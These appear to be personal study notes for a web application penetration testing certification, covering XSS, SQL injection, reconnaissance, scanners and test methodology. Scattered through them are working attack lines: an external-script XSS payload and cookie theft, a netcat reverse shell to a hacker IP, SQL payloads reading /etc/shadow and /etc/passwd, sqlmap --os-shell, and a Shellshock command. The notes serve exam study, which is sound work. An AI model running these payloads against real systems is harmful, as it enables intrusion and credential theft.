#### **Requirements**

·         1 proctored exam

·         75 questions

·         Time limit of 2 hours

·         Minimum Passing Score of 71%

##### **Exam Topic Areas**

1.     AJAX

2.     Automated Web Application Vulnerability Scanners

3.     Cross Site Scripting and Attack Frameworks

4.     Programming Fundamentals

5.     Reconnaissance

6.     Scanning and Mapping

7.     Session Tracking and SSL

8.     SQL Injection

9.     Understanding the Web and HTTP

10.  Web App Pen Test Methodology and Reporting

#### **AJAX**

Goal: The candidate will demonstrate an understanding of AJAX technology and its known weaknesses

- Enables Web 2.0
- Allows for more &#39;thick&#39; client type functionality
- Popular feature of AJAX enabled site is &#39;[mash-ups&#39;](http://www.openajax.org/whitepapers/Ajax%20and%20Mashup%20Security.php#Mashups).

  - Same origin policy will cause issues for these type of sites
    - Solved by using proxy servers in between client browsers and backend applications
    - However, it creates security issue (attackers can use that proxy servers by manipulating parameters to perform various attacks)
      - Can be prevented by using check string on proxy server
- Attack surface of AJAX based applications is HIGHER than normal applications
  - Large amount of client-side code (may include business logic on client side)
  - Logic attacks are possible (e.g. changing the order of calls to server from client)
    - Such issues are not spotted by tools
    - Earlier step of mapping the application is a crucial step to find issues in this type; More difficult to find such issues and very hard to even fix them
- CSRF, SQLi and XSS can work on AJAX based applications
- Tools: _sprajax (blackbox based)_, _Ratproxy_ (passive scanner), _ZAP_ Ajax spidering (active)
- Another problem with AJAX based application is the complexity involved in the app coding
- Data format in AJAX based communications could be XML and JSON based
  - Client side JS code can load the JSON data into its memory

#### **Automated Web Application Vulnerability Scanners**

Goal: The candidate will demonstrate familiarity with automated tools used to find web application vulnerabilities and their distinguishing features.

- Automated web app scanners differ with Nessus in the way the plug-ins send traffic
- Issues with automated scanners are:
  - Tester must be aware of how to use the tool effectively
  - Must run multiple scans for same target to obtain efficient &amp; effective results
  - Tools often have false positives; sometimes even false negatives
  - Selecting all plug-ins at a time for the full scan is a problem; crashes the tool
- SkipFish - active web application security reconnaissance tool
  - Written in C, fast
  - Large number of config options, while running the tool is simple
  - Runs based on dictionary selected and responses obtained from site
  - Produces heavy log files and could lead to memory being exhausted
  - Can analyse the content or perform brute force
    - Three modes of testing: No brute-force (regular test missing non-linked files), Minimal brute-force (quick test, excellent start, fuzzes file names or extensions) and normal brute-force (performs all tests)
      - Can scan a site that has multiple technologies involved
- w3af (Web Application Attack and Audit framework)
  - Written in python; Has both GUI (based on profiles) and command-line (can be used in scripting)
  - Comes with SQLMap and BeEF exploitation based tools bundled
  - Has _audit plugins_ (that actually finds the flaws like XSS, SQLi, Response splitting, CSRF, etc.)
    - Has _generic and detailed__auth plugins_
    - Has _brute-force plugins_ (currently supported for HTTP basic and forms based authentication)
    - Has _crawl, infrastructure and mangle plugins_
    - Has _discovery plugins_ (Robots txt file reader, detecting transparent proxy and uses Google spider (cache))
    - Has _evasion plugins_ (by modifying requests and trying to check for penetration possibilities)
  - Checks sslcertificate issues, unssl and os command injection flaws
  - Possibility to bypass mod\_security installations by using hex encoding
    - Has _grep plugins_ (searches useful results like path disclosure, code disclosure, AJAX code, email addresses, language used in the site, etc.)
    - After the w3af execution, exploit functionality allows the obtain a shell or DB data
- Other tools: Ratproxy, Paros Proxy (java based),  ZAP, WebInspect, AppScan, Acunetix WVS, Qualys WAS, Whitehat Sentinel, Trustwave App Scanner

- Fuzzing: [https://code.google.com/p/fuzzdb/](https://code.google.com/p/fuzzdb/)
  - Burp Intruder or ZAP fuzzing can be used

- Burp Suite
  - Sniper – each position is completely fuzzed before next position starts
  - Battering Ram – One payload is injected into all positions (in XSS test)
  - Pitchfork – Each position is fuzzed simultaneously
  - Cluster Bomb – Iterates through each position&#39;s payload
- ZAP
  - Spider – detect directories based on dictionary

#### **Cross Site Scripting and Attack Frameworks**

Goal: The candidate will demonstrate an understanding of the types of XSS attacks and XSS attack frameworks that can be utilized during a pen test

XSS

- Attack targets the browser and not the server; however impact could be on client or server side
- Same origin policy: Ensures client code runs for the associated application (determined by server, port and protocol)
- Some sites use white-listing or black-listing or both to prevent XSS
  - These may be bypassed using Unicode and hex encoding
- Types: Reflected, Stored / Persistent and DOM-based
- Tools: BurpSuite, ZAP, XSSer, XSSSniper, XSScrapy, TamperData
- XSS Fuzzing: Reflection tests, Filter tests, POC payloads
  - [https://code.google.com/p/fuzzdb/source/browse/trunk/attack-payloads/xss/](https://code.google.com/p/fuzzdb/source/browse/trunk/attack-payloads/xss/)
  - [https://www.owasp.org/index.php/JBroFuzz](https://www.owasp.org/index.php/JBroFuzz)
- HTML injection; Image injection; Iframe injection;
- Possible to read cookies, redirecting a user or run any external scripts
  - \&lt;script src=&quot;http://evil.site/malicious.js&quot; \&gt;
  - \&lt;img src=&quot;images/logo.gif&quot; onload=&quot;javascript:alert(document.cookie);&quot;;\&gt;

CSRF

- Leverages the trust the site has in the user (or user&#39;s browser) and uses predictable parameters
- ZAP with API enabled generated an Anti-CSRF form to check the vulnerability
- Four steps to test (manual):
  - Review app logic
  - Find sensitive page with predictable parameters
  - Create HTML page with the request
  - Access the page while logged in and check the function execution on application back-end
- Powerful exploitation tool: BeEF (PHP based app) (uses hook.js)
  - Clipboard stealing, History Browsing, Port Scanning, Browser exploits, Inter-protocol exploitation
- Other tools: [https://code.google.com/p/monkeyfist/](https://code.google.com/p/monkeyfist/)[
](https://code.google.com/p/monkeyfist/)

#### **Programming Fundamentals**

Goal: The candidate will demonstrate familiarity with modern web-based languages including JavaScript with Ajax, and Python

AJAX

- XMLHttpRequest
  - open(&quot;GET&quot;,&quot;\&lt;URI\&gt;&quot;);
  - send(); à Send data like XML / JSON, etc. in this field as String.
  - onreadystatechange = \&lt;function may be called\&gt;
  - readyState
    - 0 – Req. is uninitialized
    - 1 – Req. has been set up
    - 2 – Req. is sent
    - 3 – Waiting for response
    - 4 – Response is complete
  - responseText

JavaScript

- \&lt;script\&gt;alert(&#39;JS&#39;)\&lt;/script\&gt;
- var variable = &quot;string&quot;
- Comments
  - /\* this is a multi-line comment \*/
  - // single line comment
- Switch / case exists in JavaScript
- while(i\&lt;=100) { alert(i) i++ }
- for(x=0;x\&lt;100;x++) { alert(x)  }
- function method(a,b,c) { window.location= url }
- Events: onload, onunload, onerror, onclick, onsubmit, onfocus, onblur, onchange, onmouseover
- Object types: String, Date, Math, Window, Document, Location, History, Array

Python

- Used to write both web apps and client apps; Two versions: 3.x and 2.x series (incompatible)
- Text = &quot;This is a sample text used for printing&quot;
  
  - print Text
- List = (&quot;data1&quot;, &quot;data2&quot;, &quot;data3&quot;)
  
  - print List[0]
- Dictionary = {&quot;key1&quot;:&quot;value1&quot; , &quot;key2&quot;:&quot;value2&quot; , &quot;key3&quot;:&quot;value3&quot;}
  
  - print Dictionary ([&quot;key1&quot;])
- Comments
  - # this is a single-line comment
  - &quot;&quot;&quot; this is a multi-line comment with double-quotes &quot;&quot;&quot;
  - &#39;&#39;&#39; this is a multi-line comment with single-quotes &#39;&#39;&#39;
- If Statement
  - If location == &quot;Singapore&quot;:
    - If Area == &quot;Tampines&quot;:
      - print Area
    - elif Area == &quot;Sengkang&quot;:
      - print Area
    - else:
      - print location
- No switch / case in Python
- While Statement
  - value = 0
  - while value \&lt;= 100:
    - URL = &quot;[https://www.example.com/pageID=](https://www.example.com/pageID=)&quot; + value
    - print URL
    - value++
    - if(value == 50):
      -       Break
- For Statement
  - list\_of\_lists = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]
    - for list in list\_of\_lists:
      - for x in list:
        - print x
- Functions
  - def method(a,b,c):
    - answer = a x b x c
    - return answer
- Requests library
  - **import** _requests_
  - _r = requests._ **get** _(&#39;https://github.com/timeline.json&#39;)_
  - _r.status\_code_
  - _r.status\_code == requests.codes.ok \&gt;\&gt; TRUE_
  - _requests.codes[&#39;temporary\_redirect&#39;] \&gt;\&gt;\&gt; 307_
  - _resp = requests.head(&quot;http://www.google.com&quot;)_
  - **print** _resp.status\_code, resp.text, resp.headers_
- File Operations
  - infile = open(&#39;userames.txt&#39;,&#39;r&#39;)
    - read à returns String
    - readline
    - readlines à returns list
    - write
    - close(&#39;usernames.txt&#39;)

#### **Reconnaissance**

Goal: The candidate will demonstrate comprehension of techniques used to conduct reconnaissance using available information.

- The most important step of the process; often always missed assuming full information
- Need to identify target machines: System architecture (load balancers, WAFs, proxies)
- Whois
  - Identifies owner of domain, contact info (phone, email and staff info) &amp; authoritative name servers
- DNS Harvesting (UDP Port: 53)
  - DNS search (nslookup [interactive mode when no host is specified] and dig for Unix/Linux); dig options: A (ip), TXT, MX, NS
  - Fierce domain scanner: Finds hosts associated to the domain
    - perl fierce.pl –dns \&lt;domain\&gt;
  - DNSrecon: Performs enumeration of the target domain (Python based, Gets SRV records)
  - DNS Zone transfer: host –la \&lt;domain\&gt;
- Open Source Information: (LinkedIn, Google+, Facebook, Twitter, MySpace, Altavista, Google Code, etc.) &amp; Search engines (Google, Bing, DuckDuckGo, MSDN, Yahoo, Blogspot, etc.)
  - Info obtained even without connecting to the target
  - Google hacking techniques (search engine directives, applies to all search engines)
    - [http://www.exploit-db.com/google-dorks/](http://www.exploit-db.com/google-dorks/)
    - site: inurl: intitle: link: (3rd party sites linked to our target) ext: (file extensions)
- SPUD (Aura) tool converts Google soap API request into general searches on the website
  - [http://research.sensepost.com/tools/footprinting/spud](http://research.sensepost.com/tools/footprinting/spud)
- Shodan (first search engine) – allows searching computers, devices and IOT
- Recon-ng: Web reconnaissance framework written in Python; Info gathering tool (50 modules) and less discovery (DNS cache spoofing) and exploitation (Command &amp; XPath injection) modules
- FOCA (Fingerprinting Org with Collected Archives); FaasT is its successor
  - Metadata: Collects info based on metadata of the resources (Users, folders, printers, s/w, emails, OS, passwords and servers)
- theHarvester, Maltego (relationship tools that maps, users, phones, emails, etc.)

#### **Scanning and Mapping**

Goal: The candidate will demonstrate an understanding of mapping and scanning web applications and servers, including port scanning, identifying services and configurations, spidering, application flow charting and session analysis.

- Recommended order of scanning:
  - Port scan (NMap): Connects to each open port and looks for banner (if none, returns &quot;nudge&quot;)
  - OS fingerprint &amp; version scan (NMap: -O detects OS and –sV detects service version and –A means both)
- Netcraft toolbar (online based: gives webserver info, technology used, etc.)
- Netcat to the application server may reveal _X-Powered-By_ and _Server_ info
  - Tool can also be used to obtain remote shell

nc –lvvnp \&lt;random port\&gt; and do command injection using:

nc \&lt;hacker ip\&gt; \&lt;random port\&gt; -e /bin/bash

Tools

- TestSSL (checks a server&#39;s service on any port for the support of TLS/SSL ciphers)
- Fierce (DNS scan for IP addresses)
- Nikto (Perl) or Yokoso (check for webserver / app server vulnerabilities)
- CeWL (builds custom word generator for use of password attacks)
- wget  (dumps the website pages to local (including links with –r option))

Checks

- Server timestamp analysis (Request a resource multiple times to check date &amp; time differences)
- Last modified values comparison (Request a resource multiple times to check HTTP header last-modified value)
- Load balancer cookie detection
- HTTPS differences (Modern-day SSL accelerators prevent this info leak)
- HTML source code discrepancies
- Look for supporting HTTP request methods
  - HTTP Request method: OPTIONS will give this info
  - Netcat to the server can give this info
- Username Harvesting (via error messages, error codes, html hidden codes, etc.)
- txt (show files/directories that don&#39;t show up on a google search)
- Comments that reveal sensitive or useful info
- Commented code &amp; disabled functionality
- Application resource map creation from root node (flow)
  - May be useful for performing authorization bypass attacks
- Load balancer analysis (Check for sticky sessions)
- Software configuration analysis (including app server vulnerability checks)
- Virtual hosting (SSL uses less number of IP addresses to service more websites)


#### **Session Tracking and SSL**

Goal: The candidate will demonstrate comprehension of session tracking and SSL/TLS use in modern web communications as well as the attacks that can leverage flaws in session state

- Server side code uses some form of data stored on client side to track sessions
- Session fixation - Could be available in a cookie, URL data, HTTP headers, hidden form fields, etc.
- Various session identifiers could be used for various resources of the same application, indicating different level of authorization required to access the resource
- Can use Burp Sequencer to explore weaknesses of sessions
- SSL relies on third-party certificate issuers called certificate authorities (CA)
- Tools: Qualys SSL Labs, SSLScan, TestSSL, etc.

#### **SQL Injection**

Goal: The candidate will demonstrate an understanding of how to perform SQL injection attacks and how to identify SQL injection vulnerabilities in applications

- Command / OS injection
- Code injection
- XML / XPATH injection
- LDAP injection
  - Trying to modify the back-end database query using the vulnerability in the application front-end
  - Makes use of Select, Insert, Update, Delete and Union SQL commands in the back-end
  - Fingerprint the database based on the different SQL queries (e.g. by system tables)

 MySQL

- Uses _load\_file()_ function to read the file
  - &#39; union select load\_file(&#39;/etc/shadow&#39;),1 #
- Uses _DUMPFILE_ or _OUTFILE_ to write data into the file
  - select \* from table into dumpfile &#39;/result.txt&#39;;
  - select \* from table into outfile &#39;/result.txt&#39;;

Oracle

- Uses _utl\_file_ to read &amp; write data but has permissions (accessible paths) set in ora.ini config file
- List all tables &quot; **SELECT**   **table\_name** , **ownerFROM** dba\_tables&quot;&quot;

MS SQL

- Uses _Bulk Insert_ to read file and insert into database
  - BULK INSERT table from &#39;c:\boot.ini&#39; –
- Doesn&#39;t had native function to write files;
  - Uses _xp\_cmdshell_ to call osql.exe to write files
- Allows OS interaction using the infamous _xp\_cmdshell_ but doesn&#39;t send data to client
  - Require four queries to interact with OS and write results to a file
  - xp\_cmdshell is disabled by default but can be re-enabled (but requires EXEC permissions)
- Port scanning using OPENROWSET command
  - select \* from OPENROWSET (&#39;SQLoledb&#39;,&#39;uid=sa; pwd=; Network=DBNETLIB; Address=10.5.42.1,80; timeout=5&#39;, &#39;select \* from table&#39;)
    -  &quot;SQL Server does not exist or access denied&quot; – indicates port CLOSED
    - &quot;OLE DB provider &#39;sqloledb&#39; reported an error.&quot; – indicates port OPEN
- List all tables &quot;SELECT \* FROM INFORMATION\_SCHEMA.TABLES WHERE TABLE\_TYPE=&#39;BASE TABLE&#39;&quot;

PostGRES

- Uses COPY command to read and write to a file
  - COPY mydata FROM &#39;/etc/passwd&#39; ;
  - COPY mydata TO &#39;/etc/passwd&#39; ;
- Uses _system_ function to communicate with OS but doesn&#39;t send data to client
  - select system(&#39;cat /etc/passwd \&gt; /tmp/results.txt&#39;);

General

- File injection (remote and local) with SQLi
  - Local or remote file (makes use of file handling techniques mentioned above)
- Prepared injection files (To obtain shell access of remote server)
  - Laudanum is a collection of pre-packaged shells (phpshell, ajaxshell, etc.)
- Tools: sqlmap, TamperData (Firefox extension)
  - ./sqlmap.py –u [http://www.example.com/app/file?key=value](http://www.example.com/app/file?key=value) --os-shell
  - Use this tool on all form fields, GET &amp; POST data, hidden links, AJAX / WebSocket, etc.
  - Options: --os-shell, --users, --passwords, --schema, --file-read=/etc/hosts
- Blind SQL Injection: Results are not displayed to client (Benchmark() for MySQL and waitfor() for MS SQL sevrer)
  - Blind SQLi Tools: BBQSQL (binary &amp; frequency search), SQLMap à both tools in python


#### **Understanding the Web and HTTP**

Goal: The candidate will demonstrate an understanding of the fundamentals web applications and their architecture and a thorough comprehension of the HTTP protocol

- Web App pen test methodology must be Proven, Repeatable and Explainable
- Need permission to perform security tests
- Server architectures: Web, App &amp; Dynamic servers &amp; proxy servers
- HTTP 1.0/1.1/2.0 (stateless in any version)
  - 0 uses binary protocol; based on Google SPDY; Push based; Multiplexed
- HTTP methods: GET, POST, HEAD, TRACE, OPTIONS, _CONNECT, PUT, DELETE_
- HTTP Request:

GET /resource HTTP 1.1

HOST: www.sans.org

Accept: \*/\*

Accept-Language: en-us

User-Agent: Mozilla/4.0 (Indicates browser compliant with historical standards) à identifies the client to the server

(5.1 = XP; 5.2=XP 64-bit/Win 2003; 6.0=Vista/2008; 6.1=7/2008 R2; 6.2=8/2012; 6.3=;8.1/2012 R2)

Proxy-connection: Keep-Alive

Cookie: key=value

Content-Length: 0

-  HTTP Response

HTTP/1.1 200 OK

Content-type: text/html;

Charset: UTF-8

Server: Apache/2.2.3 (Redhat)

Date: Tue, 01 May 2015 12:49:13 GMT

Content-Length: 6243

- HTTP status codes:
  - 1xx – Informational (100=continue; 101=switching protocols; 102=Processing)
  - 2xx – Success (201=Created; 202=Accepted; 203=Non-Authz Info; 204=No Response; 206=Partial Content)
  - 3xx – Redirection (301=Moved Permanently; 302=Redirect / Found; 304=Not modified/loaded from browser cache; 306=switch proxy; 307=Temporary redirect; 308=Permanent redirect)
  - 4xx – Client error (401=unauthorized; 403=Forbidden; 404=resource not found; 405=method not allow)
  - 5xx – Server error (502=bad gateway; 503=service unavailable; 505=http version not supported; 598/599=network)
- WebSocket: Adds support for bidirectional communications over a single TCP socket; typically found in .js files or in HTML using \&lt;script\&gt; block
- Basic authentication:
  - HTTP status code is 401 / 403 to get the basic authentication pop-up on browser
  - Base64 encoded: 10 numbers, 26 small letters, 26 capital letters
  - Brute-force attack is possible; No Account lockout; Can be replayed
  - No logout available unless browser is closed manually
- Digest authentication:
  - HTTP status code is 401 / 403 to get the basic authentication pop-up on browser
  - Uses MD5 hash for passwords exchange; Uses nonce as salt;
  - qop (quality of protection) flag tells client how to generate response hash
  - cnonce – provided by server as salt (client nonce)
  - Has no account lockout; subject to brute-force
  - No logout functionality unless browser is closed manually
  - MITM possible by pretending to be a site and playing with nonce
- Integrated Windows Authentication (IWA):
  - Uses windows OS authentication; Typically used in intranets; Uses LMHash
  - CSRF is possible with IWA; XSS can automate CSRF
- Forms-based authentication:
  - HTTP status code is 200 even to get a login form;
  - Customized / app-dependent authentication mechanism
  - Requires a login form, processing code and defining protected resources
  - Session management is as coded by developer
- OAuth:
  - Doesn&#39;t actually authenticate but delegated it to third-parties
  - Has three party involved: user, consumer and service provider
  - Relies on trust between user and service provider

#### **Web App Pen Test Methodology and Reporting**

Goal: The candidate will demonstrate comprehension of the typical methods and components used during a web application penetration test

Web App Pen Test Preparation

- Defining scope
- Gathering required information (emergency contacts, dual login accounts, etc.)
- Rules of engagement (communication plan, timeframe, etc.) + identify tester traffic and data
- Reporting expectations: Executive summary, Intro, Methodology, Findings, Conclusion (possibly followed by presentation)

Tips

- Reporting must be part of each step from the beginning of pen test approach
- Never open holes for other attackers during our pen tests
- Need to be careful to not cause DOS attacks on production systems

Web App Pen Test Methodology (cynical in nature)

- Reconnaissance: Research the target
- Mapping: Understand what makes up the application and its surroundings
  - Spider the site, Identify application flow and Gather session IDs and tokens
- Discovery: Look for vulnerabilities
- Exploitation (make sure to not cause DOS attacks and not open channels for true attackers in this phase): Launch the attacks &amp; look for other hidden vulnerabilities
  - Information leakage flaws
  - Configuration flaws
  - Bypass flaws
  - Injection flaws
  - Session exploits
- Reporting

Pen Tester Toolkit

- Create &amp; maintain attack platform (Kali Linux / Samurai WTF)
- Dynamic app server scanners (all automated scanner tools)
  - Interception proxies (Burp, ZAP)
- Hacker browser setup (remove client side security restrictions to perform attack)

**Well Known Vulnerabilities**

Goal: List some of the well known vulnerabilities and what they do

- Heartbleed: Purely OpenSSL based vulnerability
  - Allowed remote attackers to read 64k chunk of memory directly from a vulnerable OpenSSL server
  - Memory can contain users / passwords / Cookies. Private keys, etc.
  - Can test using: [https://github.com/sensepost/heartbleed-poc](https://github.com/sensepost/heartbleed-poc)
- Shellshock:  Execute commands on vulnerable servers
  - () {:;}; /bin/cat /etc/passwd
- Path Traversal (../../../../) based attack
- Encoding examples:
  - %2F%2E%2E - /..
- Directory browsing: ZAP or OWASP DirBuster or Google search (using hacking techniques)
- Command Injection: Injecting data like ; &amp; |
- Local File Inclusion (LFI) / Remote File Inclusion (RFI) (from perspective of application server) Can try PHP based RFI (shell\_exec) &amp; open backdoors





Mine:

DB types

Nmap options
